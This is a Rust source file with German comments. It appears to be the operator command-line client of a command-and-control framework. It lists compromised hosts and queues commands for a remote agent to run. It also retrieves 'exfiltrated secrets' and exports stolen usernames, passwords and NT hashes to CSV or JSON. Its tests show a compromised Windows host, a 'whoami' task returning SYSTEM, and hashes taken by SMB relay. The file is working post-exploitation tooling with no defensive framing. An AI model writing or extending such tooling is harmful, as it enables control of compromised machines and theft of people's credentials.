//! HTTP-Client für die kx-server-API mit TLS und Bearer-Auth.
//!
//! Die Nachrichtentypen stammen aus `kx_core::c2` — der Client liest genau die
//! Struktur, die der Server liefert. Der Transport des Protokolls (TLS-Aufbau,
//! Bearer-Header, URL-Bildung, Status→Fehler) liegt in
//! `kx_core::c2::transport`; dieses Modul ist ein dünner Adapter darüber.

use std::io::Write;
use std::path::Path;

use kx_core::c2::transport::{Transport, TransportError};
use kx_core::c2::{
    CreateTaskRequest, ExfiltratedSecret, Host, Task, PATH_HOSTS, PATH_SECRETS, PATH_TASKS,
    PATH_TASKS_CREATE,
};
use thiserror::Error;

/// Fehler bei API-Requests.
///
/// Die Transportfehler kommen aus `kx_core::c2::transport` — dort steht die
/// einzige Fehlertaxonomie des C2-Protokolls. Was hier bleibt, ist der Fehler
/// der Bedienung: das Schreiben der Exportdatei.
#[derive(Debug, Error)]
pub enum ApiError {
    /// Fehler aus dem C2-Transport.
    #[error(transparent)]
    Transport(#[from] TransportError),
    /// Datei-I/O-Fehler.
    #[error("Datei-I/O-Fehler: {0}")]
    Io(String),
}

/// API-Client — ein Adapter über den Transport aus `kx_core::c2::transport`.
pub struct Client {
    transport: Transport,
}

impl Client {
    /// Erzeugt einen Client für den angegebenen Server.
    pub fn new(server: &str, token: &str, cert: &str) -> Result<Self, ApiError> {
        Ok(Self {
            transport: Transport::from_cert_file(server, token, cert)?,
        })
    }

    /// Liefert alle Hosts.
    pub async fn hosts(&self) -> Result<Vec<Host>, ApiError> {
        Ok(self.transport.get_json(PATH_HOSTS)?)
    }

    /// Liefert alle exfiltrierten Secrets.
    pub async fn secrets(&self) -> Result<Vec<ExfiltratedSecret>, ApiError> {
        Ok(self.transport.get_json(PATH_SECRETS)?)
    }

    /// Liefert alle Tasks.
    pub async fn tasks(&self) -> Result<Vec<Task>, ApiError> {
        Ok(self.transport.get_json(PATH_TASKS)?)
    }

    /// Legt einen Task an und liefert die ID zurueck.
    ///
    /// Der Agent holt den Task ueber `GET /api/tasks` ab, fuehrt ihn aus und
    /// meldet das Ergebnis zurueck.
    pub async fn create_task(&self, req: &CreateTaskRequest) -> Result<String, ApiError> {
        let task: Task = self.transport.post_json_response(PATH_TASKS_CREATE, req)?;
        Ok(task.id)
    }
}

/// Exportiert Secrets als JSON oder CSV.
pub fn export(secrets: &[ExfiltratedSecret], path: &Path, format: &str) -> Result<(), ApiError> {
    let mut file = std::fs::File::create(path).map_err(|e| ApiError::Io(e.to_string()))?;
    match format {
        "csv" => {
            writeln!(
                file,
                "host_id,cred_type,username,password,source,collected_at"
            )
            .map_err(|e| ApiError::Io(e.to_string()))?;
            for s in secrets {
                writeln!(
                    file,
                    "{},{},{},{},{},{}",
                    s.host_id, s.cred_type, s.username, s.password, s.source, s.collected_at
                )
                .map_err(|e| ApiError::Io(e.to_string()))?;
            }
        }
        _ => {
            serde_json::to_writer_pretty(&mut file, secrets)
                .map_err(|e| ApiError::Io(e.to_string()))?;
        }
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn export_writes_csv() {
        let secrets = vec![ExfiltratedSecret {
            id: "1".into(),
            host_id: "h1".into(),
            cred_type: "password".into(),
            username: "admin".into(),
            password: "secret".into(),
            source: "test".into(),
            collected_at: "2025-11-07T00:00:00Z".into(),
            sealed_password: String::new(),
        }];
        let dir = std::env::temp_dir();
        let path = dir.join("kx-cli-test.csv");
        export(&secrets, &path, "csv").unwrap();
        let content = std::fs::read_to_string(&path).unwrap();
        assert!(content.contains("admin"));
        std::fs::remove_file(path).ok();
    }

    /// Der Regressionstest für den ausgelieferten Defekt: der Client muss das
    /// Server-JSON lesen können. Vorher stand hier kein Test — der CLI-Typ
    /// erwartete `output`, der Server sendete `result`, und der Fehler fiel
    /// niemandem auf, weil `output` optional war.
    #[test]
    fn cli_reads_the_task_result_from_server_json() {
        let json = r#"[{"id":"t-1","host_id":"10.0.0.5","command":"whoami","status":"done",
            "result":"nt authority\\system","created_at":"2026-11-11T00:06:00Z"}]"#;
        let tasks: Vec<Task> = serde_json::from_str(json).expect("Server-JSON lesbar");
        assert_eq!(tasks.len(), 1);
        assert_eq!(tasks[0].result, "nt authority\\system");
    }

    /// Und derselbe Weg für Hosts und Secrets — die beiden Typen, die vorher
    /// zwar passen, aber an zwei Stellen getrennt gepflegt wurden.
    #[test]
    fn cli_reads_hosts_and_secrets_from_server_json() {
        let hosts_json = r#"[{"host_id":"10.0.0.5","ip":"10.0.0.5","hostname":"target",
            "os":"Windows","status":"compromised","first_seen":"2026-11-11T00:00:00Z",
            "last_seen":"2026-11-11T00:05:00Z"}]"#;
        let hosts: Vec<Host> = serde_json::from_str(hosts_json).expect("Server-JSON lesbar");
        assert_eq!(hosts[0].host_id, "10.0.0.5");
        assert_eq!(hosts[0].status, "compromised");

        let secrets_json = r#"[{"id":"s-1","host_id":"10.0.0.5","cred_type":"nt_hash",
            "username":"Administrator","password":"hash","source":"smb_relay",
            "collected_at":"2026-11-11T00:05:00Z"}]"#;
        let secrets: Vec<ExfiltratedSecret> =
            serde_json::from_str(secrets_json).expect("Server-JSON lesbar");
        assert_eq!(secrets[0].host_id, "10.0.0.5");
        assert_eq!(secrets[0].cred_type, "nt_hash");
    }
}
